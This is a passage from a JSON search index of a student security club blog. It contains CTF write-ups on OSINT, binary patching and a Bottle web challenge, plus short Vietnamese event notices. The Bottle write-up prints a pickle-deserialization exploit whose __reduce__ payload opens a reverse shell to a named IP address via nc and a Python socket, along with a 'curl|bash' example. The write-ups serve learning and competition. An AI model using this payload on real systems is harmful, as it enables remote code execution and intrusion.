signature so I know its you. It is time to find Who is the killer.\nCategory: OSINT\nFinding the location From the given image, I managed to have found the location on Google Maps at 41.154248, -8.682320.\nThen in the comment section of the location, I got the mentioned secret email, labeled noodlesareramhackers@gmail.com.\nGetting further informations I then sent an email to the email above, and got the next instructions.\nFinding the deleted tweet In the first challenge of the Osint Crime Confusion set (W is for Where), I found the instagram of a person named Heather James.\nThen from this person’s informations, I found the twitter account of University of Dutch ThE of Topics in Science.\nI then immediately knew we have to bring the account to the Wayback Machine to gain access to the deleted tweet. The email did mention about the tweet’s id (1612383535549059076), so we can paste this URL into the Wayback Machine: https://twitter.com/UThE_TS/status/1612383535549059076\nWe successfully gained access to the deleted tweet!\nExploring the killer’s GitHub From the email, we also know that we should continue searching in GitHub. Frankly enough, when I tried to search for “potatoes eating camels” in GitHub, this showed up:\nThe descriptions imply that the person is “still improving wiki”. We then head into the wiki of this repository to find out the end of our journey.\nConcatenate the first letters of the last 7 sentences of the poem, we have our flag for the challenge: idek{JULIANA_APOSIDM723489}.\nConclusion A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as using Wayback Machine or finding locations on Google Maps.\n","date":1673841054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673841054,"objectID":"52c028b7047c41e2b3988f4917b783fa","permalink":"https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/","publishdate":"2023-01-16T03:50:54Z","relpermalink":"/blog/fazect/idekctf2022_osintcrime3/","section":"blog","summary":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3.","tags":["ctf","writeup","osint","idekctf-2022"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" Table of Contents Introduction Static Analysis Reaching case 14 Reaching case 1 Patch the binary Result Introduction Given binary: Get it here!\nDescription: If you can make the program runs faster, you’ll get the flag!\nCategory: Reverse Engineering\nStatic Analysis The challenge provides us with a single binary, named slow.exe. By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code.\nAnalyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below.\nint __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh] int v5[45]; // [esp+8h] [ebp-B8h] BYREF v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it.\nint __cdecl sub_4013B0(_DWORD *a1) { int result; // eax int v2; // eax int v3; // [esp+4h] [ebp-64h] ... snip int v37; // [esp+64h] [ebp-4h] int v38; // [esp+64h] [ebp-4h] while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\u0026#34;RESULT: %d\\n\u0026#34;, v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } It is easy to observe that only case 1 and case 14 involve calling other functions.\nTo be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog.\nReaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow.\nint __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF char Buffer; // [esp+110h] [ebp-124h] BYREF _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF char v5[32]; // [esp+210h] [ebp-24h] BYREF qmemcpy(v5, \u0026#34;Áõ\u0026#34;, 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026amp;Buffer, \u0026#34;%d\u0026#34;, 55 * a1); sub_401160(v5, v2, 30, \u0026amp;Buffer, \u0026amp;v4[strlen(\u0026amp;Buffer)] - v4); return sub_401040(\u0026#34;flag is: %s\u0026#34;, (char)v2); } The function receives our modified variable Block, then uses it to produce our flag.\nReaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.\nint __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h] v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag.\nPatch the binary So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part.\nmov ecx, [ebp+arg_0] mov edx, [ecx+10h] sub edx, 1 mov eax, [ebp+arg_0] mov [eax+10h], edx mov ecx, [ebp+var_10] push ecx mov edx, [ebp+var_C] push edx call sub_401110 add esp, 8 mov [ebp+var_58], eax mov eax, [ebp+arg_0] Instead of calling sub_401110, we should patch the program to directly calculates ecx + edx then assigns it into eax. We find out that the opcode of call sub_401110 is E8 77 FC FF FF.\nUsing IDA Pro integrated settings, which can be found at Options \u0026gt; Generals \u0026gt; Number of Opcode bytes (non-graph) set to a large enough number, we can view each instruction’s opcode.\nWith pwntools library, we also find out the opcode for add ecx, edx and move eax, ecx is 01 D1 and 89 C8 using this script written in Python below.\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; print(asm(\u0026#39;add ecx, edx\u0026#39;)) print(asm(\u0026#39;mov eax, ecx\u0026#39;)) It is now time to patch the binary. Use any hex editor of your choice to patch the binary, here I use IDA Pro’s integrated hex view to patch the binary.\nChange E8 77 FC FF FF to 01 D1 89 C8 90 using any hex editor of your choice (here 90 corresponds to the NOP …","date":1673624694,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673624694,"objectID":"40a209ad7f2b9aede0004e8de94746bc","permalink":"https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/","publishdate":"2023-01-13T16:17:00Z","relpermalink":"/blog/fazect/isitdtu-2022-slow/","section":"blog","summary":"An in-depth writeup on ISITDTU CTF 2022 Finals - Slow.","tags":["ctf","writeup","re","isitdtu-2022"],"title":"ISITDTU CTF 2022 Finals - Slow","type":"blog"},{"authors":["hdthinh1012"],"categories":null,"content":" Table of Contents Problem statement Basic Python Bottle Pickle exploit The exercise step Generate cookie Reference Links Problem statement Author hints that flag is executable\nThe website is vulnerable to directory traversal Pick /etc/self/procline to get the start application command So the application source is located at /app/app.py from bottle import route, run, template, request, response, error from config.secret import sekai import os import re @route(\u0026#34;/\u0026#34;) def home(): return template(\u0026#34;index\u0026#34;) @route(\u0026#34;/show\u0026#34;) def index(): response.content_type = \u0026#34;text/plain; charset=UTF-8\u0026#34; param = request.query.id if re.search(\u0026#34;^../app\u0026#34;, param): return \u0026#34;No!!!!\u0026#34; requested_path = os.path.join(os.getcwd() + \u0026#34;/poems\u0026#34;, param) try: with open(requested_path) as f: tfile = f.read() except Exception as e: return \u0026#34;No This Poems\u0026#34; return tfile @error(404) def error404(error): return template(\u0026#34;error\u0026#34;) @route(\u0026#34;/sign\u0026#34;) def index(): try: session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} response.set_cookie(\u0026#34;name\u0026#34;, session, secret=sekai) return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) except: return \u0026#34;pls no hax\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: os.chdir(os.path.dirname(__file__)) run(host=\u0026#34;0.0.0.0\u0026#34;, port=8080) If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap\nThe hint said flag is executable, meaning RCE is possible.\nBasic Let’s have a look at Python Bottle\nPython Bottle Bottle signed cookie Bottle first:\npickle.dumps([name, value], -1) then base64 encode → encoded hmac encrypt the secret seperately then base64 encode → signature add ‘!’ at the first char and ‘?’ in between signature Cookie format: !secret_hmac_base64==?pickle_name_value_base64==\nBottle verify cookie get_cookie:\n… base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1)) We have controlled the value input through cookie\nPickle exploit Ref Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)\n\u0026gt;\u0026gt;\u0026gt; pickled = pickle.dumps([\u0026#39;pickle\u0026#39;, \u0026#39;me\u0026#39;, 1, 2, 3]) \u0026gt;\u0026gt;\u0026gt; import pickletools \u0026gt;\u0026gt;\u0026gt; pickletools.dis(pickled) 0: \\x80 PROTO 4 2: \\x95 FRAME 25 11: ] EMPTY_LIST 12: \\x94 MEMOIZE (as 0) 13: ( MARK 14: \\x8c SHORT_BINUNICODE \u0026#39;pickle\u0026#39; 22: \\x94 MEMOIZE (as 1) 23: \\x8c SHORT_BINUNICODE \u0026#39;me\u0026#39; 27: \\x94 MEMOIZE (as 2) 28: K BININT1 1 30: K BININT1 2 32: K BININT1 3 34: e APPENDS (MARK at 13) 35: . STOP pickle still allows you to define a custom behavior for the pickling process for your class instances.\nThe __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). […] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […] So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.\nSo if any value in the array pass into pickle.dumps is an instance containing __reduce__(…) function, that reduce will be executed when calling pickle.loads(…). And the __reduce__(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.\nSo by implement reduce method that return (eval, (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;curl xxx|bash\u0026#34;)\u0026#39;,)) , we can execute code on the server.\nThe exercise step Generate cookie Add an class definition with __reduce__ method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.\nclass RCE: def __reduce__(self): # 14.186.174.164 cmd = (\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 14.186.174.164 55555 \u0026gt; /tmp/f\u0026#39;) return os.system, ((f\u0026#34;\u0026#34;\u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;14.186.174.164\u0026#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34;),) # Test @route(\u0026#34;/sign\u0026#34;) def index(): session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) print(session[\u0026#34;name\u0026#34;]) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: objWithReduce = RCE() session = …","date":1673481600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673481600,"objectID":"2256b16fb9515e2dc5aa0a85914de4e5","permalink":"https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/","publishdate":"2023-01-12T00:00:00Z","relpermalink":"/blog/duti/sekai-ctf-2022-bottle-poem/","section":"blog","summary":"Deserialization attack with Python Bottle.","tags":["ctf","writeup","web exploitation"],"title":"Sekai CTF 2022 Bottle Poem","type":"blog"},{"authors":[],"categories":null,"content":" ","date":1666893600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1666893600,"objectID":"8e723f582259e44e14817f259e85b85a","permalink":"https://blog.bkisc.com/event/2022-10-27-hieupc-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-10-27-hieupc-talk/","section":"event","summary":"Anh Ngô Minh Hiếu, hiện là chuyên viên kỹ thuật tại Trung tâm Giám sát và An toàn không gian mạng Quốc gia (NCSC), sẽ có những chia sẻ về kinh nghiệm của bản thân trong việc ngăn chặn các thông tin lừa đảo, giả mạo, không chính thống. Qua đó, anh sẽ đưa ra những bài học, những dấu hiệu cơ bản của một thông tin giả mạo để người dùng có thể tránh khỏi những thông tin như vậy.","tags":[],"title":"Techtalk Event: Nhận thức về An toàn thông tin","type":"event"},{"authors":null,"categories":null,"content":"Ngày 15/10/2022, câu lạc bộ BKISC có 2 đội tham dự vòng thi sơ khảo ASCIS 2022 bảng VN2 đã đạt được hai giải khuyến khích đó là đội COPIUM (hạng 17) và BKISC (hạng 9). Trong đó xin chúc mừng BKISC lọt vào vòng chung khảo ASCIS 2022 sẽ diễn ra vào ngày 13/11/2022.\n","date":1665792e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1665792e3,"objectID":"3775ebd6f365f84f10893592a700a57c","permalink":"https://blog.bkisc.com/post/22-10-25-ascis-2022-so-khao/","publishdate":"2022-10-15T00:00:00Z","relpermalink":"/post/22-10-25-ascis-2022-so-khao/","section":"post","summary":"Ngày 15/10/2022, câu lạc bộ BKISC có 2 đội tham dự vòng thi sơ khảo ASCIS 2022 bảng VN2 đã đạt được hai giải khuyến khích đó là đội COPIUM (hạng 17) và BKISC (hạng 9).","tags":null,"title":"Câu lạc bộ BKISC tham gia vòng sơ khảo ASCIS 2022","type":"post"},{"authors":[],"categories":null,"content":" ","date":1662400800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1662400800,"objectID":"b5eaca94b40ea8028a014bf4da285bb5","permalink":"https://blog.bkisc.com/event/2022-09-05-thaidn-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-09-05-thaidn-talk/","section":"event","summary":"Anh Dương Ngọc Thái, hiện đang làm việc tại Google và thường được biết đến thông qua blog cá nhân vnhacker@blogspot, sẽ kể về những lần tham gia kiểm thử và tấn công hệ thống của một số bệnh viện và ngân hàng ở Việt Nam. Qua đó, anh nói lên tầm quan trọng của kiểm thử bảo mật phần mềm và chính sách breach notification nhằm nâng cao nhận thức về bảo vệ thông tin người dùng của doanh nghiệp.","tags":[],"title":"Grokking Techtalk 46: Những bài học về xâm nhập và bảo vệ hệ thống mạng Việt Nam","type":"event"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"6d99026b9e19e4fa43d5aadf147c7176","permalink":"https://blog.bkisc.com/contact/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/contact/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"62f29b617f905dd761b82d25a24bf276","permalink":"https://blog.bkisc.com/members/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/members/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"8e3aab287e330ba4efa5040ba790d4eb","permalink":"https://blog.bkisc.com/introduction/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/introduction/","section":"","summary":"","tags":null,"title":"Introduction","type":"widget_page"}]